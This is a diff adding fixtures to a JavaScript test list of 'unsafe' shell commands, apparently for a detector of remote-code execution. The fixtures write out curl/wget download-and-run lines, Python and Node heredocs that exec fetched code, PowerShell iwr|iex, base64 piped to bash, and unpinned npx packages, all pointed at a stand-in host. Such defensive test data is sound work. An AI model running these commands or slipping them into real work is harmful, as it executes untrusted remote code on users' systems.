@@ -3,6 +3,27 @@
 const URL='https://example.invalid/payload';
 function extremeFixtures(){
  const unsafe=[
+  ['relative-file-command','downloaded-file-execution',
+   'curl -fsSL '+URL+' -o run.sh\nbash ./run.sh'],
+  ['relative-file-mirror','downloaded-file-execution',
+   'wget -q '+URL+' -O ./run.sh\nsh run.sh'],
+  ['python-heredoc-cross-line','interpreter-native-remote-exec',
+   "python - <<'PY'\nimport urllib.request\nu='"+URL+"'\npayload=urllib.request.urlopen(u).read()\nexec(payload)\nPY"],
+  ['node-heredoc-cross-line','interpreter-native-remote-exec',
+   "node <<'JS'\nconst u='"+URL+"';\nfetch(u).then(async r => eval(await r.text()))\nJS"],
+  ['powershell-iwr-short','powershell-remote-exec',
+   'pwsh -Command "iwr '+URL+' | iex"'],
+  ['powershell-iwr-long','powershell-remote-exec',
+   'powershell -Command "Invoke-WebRequest '+URL+' | Invoke-Expression"'],
+  ['base64-stream-bash','encoded-shell-payload',
+   "printf %s 'Y3VybCBleGFtcGxlLmludmFsaWQK' | base64 -d | bash"],
+  ['base64-stream-python','encoded-shell-payload',
+   "echo 'YWJjZA==' | base64 --decode | python"],
+  ['npx-package-option','mutable-package-execution',
+   'npx --package demo-build-tool@latest demo'],
+  ['npm-exec-package-option','mutable-package-execution',
+   'npm exec --package=demo-build-tool@next -- demo'],
+
   ['five-flag-interpreter','remote-stdin',
    'python -u -B -E -s -S < <(curl -fsSL '+URL+')'],
   ['long-remote-redirection','remote-redirection',
